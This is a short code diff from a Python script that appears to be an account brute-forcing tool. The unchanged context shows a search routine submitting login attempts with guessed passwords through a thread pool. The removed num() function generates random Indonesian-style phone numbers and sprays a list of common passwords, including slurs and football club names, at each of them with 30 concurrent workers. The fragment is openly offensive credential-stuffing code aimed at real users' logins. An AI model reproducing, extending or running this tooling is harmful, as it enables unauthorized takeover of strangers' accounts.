@@ -105,24 +105,7 @@ def search():
                  litpas.append('Bangladesh')
                  for passw in set(litpas):
                      ex.submit(login,(users[1]),(passw))
-def num():
-    with ThreadPoolExecutor(max_workers=30) as ex:
-         for n in range(1000):
-             rd=random.randint(11111111,99999999)
-             b=['96','95','57','58','38','19','13','77']
-             b1=random.choice(b)
-             g=str(b1)
-             nm='08'+g+str(rd)
-             litpas=[
-                   'Sayang',
-                   'Bangsat',
-                   'Anjing',
-                   'Kontol',
-                   'Persib',
-                   'Persija'
-                   ]
-             for passw in set(litpas):
-                 ex.submit(login,(nm),(passw))
+
 if __name__=="__main__":
      clear()
      baner()
